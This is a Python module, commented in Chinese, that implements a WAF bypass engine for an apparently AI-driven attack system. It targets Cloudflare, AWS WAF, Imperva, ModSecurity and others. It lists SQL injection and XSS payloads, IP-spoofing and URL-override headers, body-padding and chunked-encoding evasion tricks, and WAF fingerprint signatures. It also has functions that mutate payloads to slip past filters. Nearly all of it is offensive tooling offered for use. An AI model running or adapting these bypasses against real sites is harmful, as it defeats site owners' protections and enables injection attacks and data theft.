"""
WAF 繞過技術字典引擎

基於 WAF 繞過技術字典生成.md 的專業知識，
提供針對各種 WAF 的繞過技術和 payload 變形能力。

支援的 WAF:
    - Cloudflare
    - AWS WAF
    - Imperva (Incapsula)
    - Akamai
    - ModSecurity
    - F5 BIG-IP ASM

繞過技術類別:
    - 編碼混淆 (Encoding & Obfuscation)
    - HTTP 協議層規避 (Protocol Evasion)
    - 特定廠商繞過 (Vendor-Specific Bypass)
"""

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any
from enum import Enum, auto

from .base import (
    WAFVendor,
    KnowledgeRegistry,
)


class BypassCategory(Enum):
    """繞過技術類別"""
    ENCODING = auto()           # 編碼混淆
    HTTP_PROTOCOL = auto()      # HTTP 協議層
    VENDOR_SPECIFIC = auto()    # 特定廠商
    PAYLOAD_MUTATION = auto()   # Payload 變形
    REQUEST_STRUCTURE = auto()  # 請求結構


@dataclass
class BypassTechnique:
    """繞過技術定義"""
    name: str
    category: BypassCategory
    target_waf: list[WAFVendor]
    description: str
    payloads: list[str]
    headers: dict[str, str] = field(default_factory=dict)
    success_rate: float = 0.5  # 估計成功率
    notes: str = ""
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "category": self.category.name,
            "target_waf": [w.value for w in self.target_waf],
            "description": self.description,
            "payloads": self.payloads,
            "headers": self.headers,
            "success_rate": self.success_rate,
        }


class WAFBypassEngine:
    """
    WAF 繞過引擎
    
    提供針對各種 WAF 的繞過技術和 payload 變形能力，
    AI 決策系統可調用此引擎獲取適合的繞過策略。
    
    使用範例:
        # 獲取針對 Cloudflare 的 SQLi 繞過技術
        techniques = WAFBypassEngine.get_bypass_techniques(
            waf_vendor=WAFVendor.CLOUDFLARE,
            attack_type="sqli"
        )
        
        # 對 payload 進行編碼變形
        variants = WAFBypassEngine.mutate_payload(
            original_payload="' OR 1=1--",
            mutation_types=["double_url", "unicode", "case_toggle"]
        )
    """
    
    # ==================== 繞過技術資料庫 ====================
    
    BYPASS_TECHNIQUES: list[BypassTechnique] = [
        # === 編碼混淆類 ===
        BypassTechnique(
            name="IBM037 Charset Encoding",
            category=BypassCategory.ENCODING,
            target_waf=[WAFVendor.AWS_WAF, WAFVendor.MODSECURITY, WAFVendor.IMPERVA],
            description="使用 EBCDIC 字符集編碼 payload，大多數 WAF 不支援解碼",
            payloads=[
                # 這些是編碼後的示例，實際使用需要動態編碼
                "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
            ],
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
            success_rate=0.7,
            notes="需要後端支援該字符集",
        ),
        
        BypassTechnique(
            name="Double URL Encoding",
            category=BypassCategory.ENCODING,
            target_waf=[WAFVendor.MODSECURITY, WAFVendor.AWS_WAF],
            description="對特殊字符進行兩次 URL 編碼",
            payloads=[
                "%252527",      # ' (單引號)
                "%252522",      # " (雙引號)
                "%25253C",      # <
                "%25253E",      # >
                "%252e%252e%252f",  # ../
            ],
            success_rate=0.5,
            notes="需要後端進行多次解碼",
        ),
        
        BypassTechnique(
            name="Unicode Normalization",
            category=BypassCategory.ENCODING,
            target_waf=[WAFVendor.CLOUDFLARE, WAFVendor.AWS_WAF],
            description="使用 Unicode 同形字繞過",
            payloads=[
                "＜script＞",     # 全形字符
                "ſelect",         # 長 s (U+017F)
                "sel\u0065ct",    # Unicode 轉義
            ],
            success_rate=0.4,
            notes="依賴後端的 Unicode 規範化處理",
        ),
        
        # === HTTP 協議層類 ===
        BypassTechnique(
            name="Chunked Transfer Encoding",
            category=BypassCategory.HTTP_PROTOCOL,
            target_waf=[WAFVendor.MODSECURITY, WAFVendor.AWS_WAF, WAFVendor.IMPERVA],
            description="使用分塊傳輸編碼分割 payload",
            payloads=[
                "Transfer-Encoding: chunked",
                "Transfer-Encoding: xchunked",
                "Transfer-Encoding : chunked",  # 冒號前有空格
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            ],
            headers={"Transfer-Encoding": "chunked"},
            success_rate=0.6,
            notes="將 payload 分割成多個 chunk",
        ),
        
        BypassTechnique(
            name="HTTP Header Spoofing",
            category=BypassCategory.HTTP_PROTOCOL,
            target_waf=[WAFVendor.CLOUDFLARE, WAFVendor.IMPERVA, WAFVendor.AWS_WAF],
            description="偽造來源 IP 相關 Header",
            payloads=[],
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
            },
            success_rate=0.3,
            notes="依賴 WAF 配置信任這些 Header",
        ),
        
        BypassTechnique(
            name="URL Rewrite Headers",
            category=BypassCategory.HTTP_PROTOCOL,
            target_waf=[WAFVendor.MODSECURITY, WAFVendor.AWS_WAF],
            description="使用 URL 覆蓋 Header 繞過路徑檢查",
            payloads=[],
            headers={
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin",
            },
            success_rate=0.4,
            notes="適用於某些框架 (Symfony, Drupal)",
        ),
        
        BypassTechnique(
            name="HTTP Parameter Pollution",
            category=BypassCategory.HTTP_PROTOCOL,
            target_waf=[WAFVendor.MODSECURITY, WAFVendor.IMPERVA],
            description="發送多個同名參數混淆 WAF",
            payloads=[
                "id=1&id=' OR 1=1--",
                "id=safe&id=malicious",
            ],
            success_rate=0.5,
            notes="WAF 可能只檢查第一個，後端使用最後一個",
        ),
        
        # === AWS WAF 特定 ===
        BypassTechnique(
            name="Oversized Body Padding",
            category=BypassCategory.VENDOR_SPECIFIC,
            target_waf=[WAFVendor.AWS_WAF],
            description="填充超過 8KB 的數據，將 payload 推至檢查視窗外",
            payloads=[
                "padding=" + "A" * 8200 + "&malicious_param=PAYLOAD",
            ],
            success_rate=0.8,
            notes="AWS WAF 預設只檢查前 8KB，CloudFront 可配置至 64KB",
        ),
        
        BypassTechnique(
            name="JSON Deep Nesting",
            category=BypassCategory.VENDOR_SPECIFIC,
            target_waf=[WAFVendor.AWS_WAF],
            description="使用深度嵌套的 JSON 結構",
            payloads=[
                '{"a":{"b":{"c":{"d":{"e":{"payload":"MALICIOUS"}}}}}}',
            ],
            success_rate=0.5,
            notes="WAF 可能無法解析深層 JSON",
        ),
        
        # === Cloudflare 特定 ===
        BypassTechnique(
            name="Attribute Overloading",
            category=BypassCategory.VENDOR_SPECIFIC,
            target_waf=[WAFVendor.CLOUDFLARE],
            description="使用大量無效屬性推擠惡意屬性",
            payloads=[
                '<div ' + ' '.join([f'data-x{i}="y"' for i in range(100)]) + ' onmouseover=alert(1)>',
            ],
            success_rate=0.4,
            notes="利用 Cloudflare 的屬性解析限制",
        ),
        
        BypassTechnique(
            name="New DOM Events",
            category=BypassCategory.VENDOR_SPECIFIC,
            target_waf=[WAFVendor.CLOUDFLARE, WAFVendor.AWS_WAF],
            description="使用新興的 HTML5 DOM 事件",
            payloads=[
                '<details open ontoggle=alert(1)>',
                '<div popover id=x ontoggle=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<video><source onerror=alert(1)>',
                '<body onpageshow=alert(1)>',
            ],
            success_rate=0.5,
            notes="WAF 規則庫可能未覆蓋新事件",
        ),
        
        # === Imperva 特定 ===
        BypassTechnique(
            name="Compression Header Mismatch",
            category=BypassCategory.VENDOR_SPECIFIC,
            target_waf=[WAFVendor.IMPERVA],
            description="Content-Encoding 與實際內容不匹配",
            payloads=[],
            headers={"Content-Encoding": "gzip"},  # 但 body 不壓縮
            success_rate=0.3,
            notes="歷史漏洞，可能已修補，但值得測試",
        ),
        
        # === SQLi 特定變形 ===
        BypassTechnique(
            name="SQL Comment Injection",
            category=BypassCategory.PAYLOAD_MUTATION,
            target_waf=[WAFVendor.MODSECURITY, WAFVendor.AWS_WAF, WAFVendor.CLOUDFLARE],
            description="在 SQL 關鍵字中插入註釋",
            payloads=[
                "UN/**/ION",
                "SE/**/LECT",
                "/*!50000UNION*/",
                "/**/OR/**/",
                "UNI%00ON",
            ],
            success_rate=0.6,
            notes="利用 SQL 解析器忽略註釋的特性",
        ),
        
        BypassTechnique(
            name="SQL Case Variation",
            category=BypassCategory.PAYLOAD_MUTATION,
            target_waf=[WAFVendor.MODSECURITY],
            description="混合大小寫繞過簡單規則",
            payloads=[
                "SeLeCt",
                "uNiOn",
                "UnIoN SeLeCt",
            ],
            success_rate=0.3,
            notes="現代 WAF 多已支援不區分大小寫",
        ),
        
        BypassTechnique(
            name="SQL Alternative Functions",
            category=BypassCategory.PAYLOAD_MUTATION,
            target_waf=[WAFVendor.AWS_WAF, WAFVendor.CLOUDFLARE],
            description="使用替代函數繞過黑名單",
            payloads=[
                "CONCAT(0x73656c656374)",  # hex of 'select'
                "CHAR(115,101,108,101,99,116)",  # ASCII codes
                "MID(column,1,1)",  # instead of SUBSTRING
                "IFNULL()",  # instead of COALESCE
            ],
            success_rate=0.5,
        ),
        
        # === XSS 特定變形 ===
        BypassTechnique(
            name="XSS HTML Entity Encoding",
            category=BypassCategory.PAYLOAD_MUTATION,
            target_waf=[WAFVendor.CLOUDFLARE, WAFVendor.AWS_WAF],
            description="使用 HTML 實體編碼",
            payloads=[
                "&#60;script&#62;",  # <script>
                "&#x3C;script&#x3E;",  # hex entities
                "&lt;script&gt;",
            ],
            success_rate=0.4,
        ),
        
        BypassTechnique(
            name="XSS JavaScript Encoding",
            category=BypassCategory.PAYLOAD_MUTATION,
            target_waf=[WAFVendor.CLOUDFLARE, WAFVendor.MODSECURITY],
            description="使用 JavaScript Unicode 轉義",
            payloads=[
                "\\u0061lert(1)",  # alert
                "\\x61lert(1)",    # hex
                "eval('al'+'ert(1)')",
                "window['alert'](1)",
            ],
            success_rate=0.5,
        ),
    ]
    
    # ==================== WAF 識別簽名 ====================
    
    WAF_DETECTION_SIGNATURES: dict[WAFVendor, dict[str, Any]] = {
        WAFVendor.CLOUDFLARE: {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
            "response_patterns": [
                r"Attention Required!",
                r"Cloudflare Ray ID",
                r"Error 1020",
                r"Please enable cookies",
            ],
            "status_codes": [403, 503],
        },
        WAFVendor.AWS_WAF: {
            "headers": ["x-amzn-requestid"],
            "response_patterns": [
                r"Request blocked",
                r"AWS WAF",
            ],
            "status_codes": [403],
        },
        WAFVendor.IMPERVA: {
            "headers": ["x-iinfo"],
            "cookies": ["incap_ses_", "visid_incap_"],
            "response_patterns": [
                r"Request unsuccessful",
                r"Incapsula incident ID",
                r"Powered by Imperva",
            ],
            "status_codes": [403],
        },
        WAFVendor.AKAMAI: {
            "headers": ["akamai-grn", "x-akamai-transformed"],
            "response_patterns": [
                r"AkamaiGHost",
                r"Reference #\d+\.\w+",
            ],
            "status_codes": [403],
        },
        WAFVendor.MODSECURITY: {
            "headers": [],
            "response_patterns": [
                r"ModSecurity",
                r"OWASP ModSecurity Core Rule Set",
                r"mod_security",
            ],
            "status_codes": [403, 406],
        },
        WAFVendor.F5: {
            "headers": ["x-wa-info"],
            "response_patterns": [
                r"The requested URL was rejected",
                r"F5 Networks",
            ],
            "status_codes": [403],
        },
    }
    
    # ==================== 公開方法 ====================
    
    @classmethod
    def detect_waf(
        cls,
        response_body: str,
        response_headers: dict[str, str],
        status_code: int,
        cookies: dict[str, str] | None = None,
    ) -> tuple[bool, WAFVendor | None, list[str]]:
        """
        檢測目標是否使用 WAF
        
        Args:
            response_body: 響應體
            response_headers: 響應 headers
            status_code: HTTP 狀態碼
            cookies: Cookie
            
        Returns:
            (是否檢測到WAF, WAF廠商, 匹配的指標)
        """
        cookies = cookies or {}
        matched_indicators: list[str] = []
        
        for vendor, signatures in cls.WAF_DETECTION_SIGNATURES.items():
            # 檢查 Headers
            for header in signatures.get("headers", []):
                if header.lower() in [h.lower() for h in response_headers.keys()]:
                    matched_indicators.append(f"header:{header}")
            
            # 檢查 Cookies
            for cookie_prefix in signatures.get("cookies", []):
                for cookie_name in cookies.keys():
                    if cookie_name.startswith(cookie_prefix):
                        matched_indicators.append(f"cookie:{cookie_name}")
            
            # 檢查響應模式
            for pattern in signatures.get("response_patterns", []):
                if re.search(pattern, response_body, re.IGNORECASE):
                    matched_indicators.append(f"pattern:{pattern}")
            
            # 檢查狀態碼
            if status_code in signatures.get("status_codes", []):
                matched_indicators.append(f"status:{status_code}")
            
            # 如果有多個匹配，確認檢測
            if len(matched_indicators) >= 2:
                return True, vendor, matched_indicators
        
        return False, None, matched_indicators
    
    @classmethod
    def get_bypass_techniques(
        cls,
        waf_vendor: WAFVendor = WAFVendor.UNKNOWN,
        attack_type: str = "all",
        min_success_rate: float = 0.0,
    ) -> list[BypassTechnique]:
        """
        獲取針對特定 WAF 的繞過技術
        
        Args:
            waf_vendor: 目標 WAF 廠商
            attack_type: 攻擊類型 (sqli, xss, all)
            min_success_rate: 最低成功率閾值
            
        Returns:
            適用的繞過技術列表
        """
        techniques = []
        
        for tech in cls.BYPASS_TECHNIQUES:
            # 篩選 WAF 廠商
            if waf_vendor != WAFVendor.UNKNOWN:
                if waf_vendor not in tech.target_waf and WAFVendor.UNKNOWN not in tech.target_waf:
                    continue
            
            # 篩選攻擊類型
            if attack_type != "all":
                if attack_type.lower() == "sqli":
                    if "SQL" not in tech.name and tech.category != BypassCategory.ENCODING:
                        if tech.category not in [BypassCategory.HTTP_PROTOCOL, BypassCategory.VENDOR_SPECIFIC]:
                            continue
                elif attack_type.lower() == "xss":
                    if "XSS" not in tech.name and "DOM" not in tech.name:
                        if tech.category not in [BypassCategory.HTTP_PROTOCOL, BypassCategory.ENCODING]:
                            continue
            
            # 篩選成功率
            if tech.success_rate < min_success_rate:
                continue
            
            techniques.append(tech)
        
        # 按成功率排序
        techniques.sort(key=lambda t: t.success_rate, reverse=True)
        
        return techniques
    
    @classmethod
    def mutate_payload(
        cls,
        original_payload: str,
        mutation_types: list[str] | None = None,
    ) -> list[dict[str, str]]:
        """
        對 payload 進行各種變形
        
        Args:
            original_payload: 原始 payload
            mutation_types: 變形類型列表
                - double_url: 雙重 URL 編碼
                - unicode: Unicode 同形字
                - case_toggle: 大小寫變換
                - comment_inject: SQL 註釋注入
                - hex_encode: 十六進制編碼
                - html_entity: HTML 實體編碼
                
        Returns:
            變形後的 payload 列表，包含變形類型說明
        """
        mutation_types = mutation_types or [
            "double_url", "unicode", "case_toggle", 
            "comment_inject", "hex_encode", "html_entity"
        ]
        
        variants: list[dict[str, str]] = []
        
        for mutation in mutation_types:
            if mutation == "double_url":
                encoded = urllib.parse.quote(urllib.parse.quote(original_payload))
                variants.append({
                    "type": "double_url_encoding",
                    "payload": encoded,
                    "description": "對 payload 進行兩次 URL 編碼",
                })
            
            elif mutation == "unicode":
                # 簡單的 Unicode 變形
                unicode_map = {
                    "<": "＜", ">": "＞", 
                    "'": "＇", '"': "＂",
                    "/": "／", "\\": "＼",
                }
                mutated = original_payload
                for char, replacement in unicode_map.items():
                    mutated = mutated.replace(char, replacement)
                variants.append({
                    "type": "unicode_fullwidth",
                    "payload": mutated,
                    "description": "使用全形 Unicode 字符替換",
                })
            
            elif mutation == "case_toggle":
                # 隨機大小寫
                toggled = ""
                for i, c in enumerate(original_payload):
                    toggled += c.upper() if i % 2 == 0 else c.lower()
                variants.append({
                    "type": "case_toggle",
                    "payload": toggled,
                    "description": "交替大小寫",
                })
            
            elif mutation == "comment_inject":
                # SQL 註釋注入
                sql_keywords = ["SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
                mutated = original_payload
                for kw in sql_keywords:
                    # 在關鍵字中間插入註釋
                    if kw.lower() in mutated.lower():
                        middle = len(kw) // 2
                        replacement = kw[:middle] + "/**/" + kw[middle:]
                        mutated = re.sub(kw, replacement, mutated, flags=re.IGNORECASE)
                variants.append({
                    "type": "sql_comment_injection",
                    "payload": mutated,
                    "description": "在 SQL 關鍵字中插入 /**/ 註釋",
                })
            
            elif mutation == "hex_encode":
                # 十六進制編碼 (用於 SQL)
                hex_encoded = "0x" + original_payload.encode().hex()
                variants.append({
                    "type": "hex_encoding",
                    "payload": hex_encoded,
                    "description": "十六進制編碼",
                })
            
            elif mutation == "html_entity":
                # HTML 實體編碼
                entity_encoded = ""
                for c in original_payload:
                    entity_encoded += f"&#{ord(c)};"
                variants.append({
                    "type": "html_decimal_entity",
                    "payload": entity_encoded,
                    "description": "HTML 十進制實體編碼",
                })
                
                # 十六進制實體
                hex_entity = ""
                for c in original_payload:
                    hex_entity += f"&#x{ord(c):x};"
                variants.append({
                    "type": "html_hex_entity",
                    "payload": hex_entity,
                    "description": "HTML 十六進制實體編碼",
                })
        
        return variants
    
    @classmethod
    def encode_ibm037(cls, payload: str) -> bytes:
        """
        使用 IBM037 (EBCDIC) 編碼 payload
        
        這是針對不解析非標準字符集 WAF 的高級繞過技術
        """
        try:
            return payload.encode('ibm037')
        except (UnicodeEncodeError, LookupError):
            # 如果系統不支援 IBM037，返回 UTF-8
            return payload.encode('utf-8')
    
    @classmethod
    def generate_chunked_body(
        cls, 
        payload: str, 
        chunk_size: int = 3,
    ) -> str:
        """
        將 payload 轉換為 chunked transfer encoding 格式
        
        Args:
            payload: 原始 payload
            chunk_size: 每個 chunk 的大小
            
        Returns:
            分塊編碼後的 body
        """
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")  # 終止 chunk
        return "".join(chunks)
    
    @classmethod
    def generate_padding(cls, size: int = 8200, param_name: str = "padding") -> str:
        """
        生成填充數據用於 AWS WAF 繞過
        
        AWS WAF 預設只檢查前 8KB 的 body
        """
        padding = "A" * size
        return f"{param_name}={padding}"
    
    @classmethod
    def get_spoof_headers(cls) -> dict[str, str]:
        """
        獲取常用的 IP 偽造 headers
        
        用於繞過基於 IP 信譽的 WAF 規則
        """
        return {
            "X-Forwarded-For": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "Cluster-Client-IP": "127.0.0.1",
            "X-Cluster-Client-IP": "127.0.0.1",
            "Forwarded": "for=127.0.0.1",
            "Forwarded-For": "127.0.0.1",
        }
    
    @classmethod
    def get_browser_headers(cls) -> dict[str, str]:
        """
        獲取模擬真實瀏覽器的 headers
        
        用於繞過機器人檢測
        """
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
    
    # ==================== 擴展接口 ====================
    
    @classmethod
    def register_technique(cls, technique: BypassTechnique) -> None:
        """註冊新的繞過技術"""
        cls.BYPASS_TECHNIQUES.append(technique)
    
    @classmethod
    def register_waf_signature(
        cls, 
        vendor: WAFVendor, 
        signatures: dict[str, Any]
    ) -> None:
        """註冊新的 WAF 識別簽名"""
        if vendor not in cls.WAF_DETECTION_SIGNATURES:
            cls.WAF_DETECTION_SIGNATURES[vendor] = signatures
        else:
            # 合併簽名
            for key, value in signatures.items():
                if key in cls.WAF_DETECTION_SIGNATURES[vendor]:
                    if isinstance(value, list):
                        cls.WAF_DETECTION_SIGNATURES[vendor][key].extend(value)
                    else:
                        cls.WAF_DETECTION_SIGNATURES[vendor][key] = value
                else:
                    cls.WAF_DETECTION_SIGNATURES[vendor][key] = value
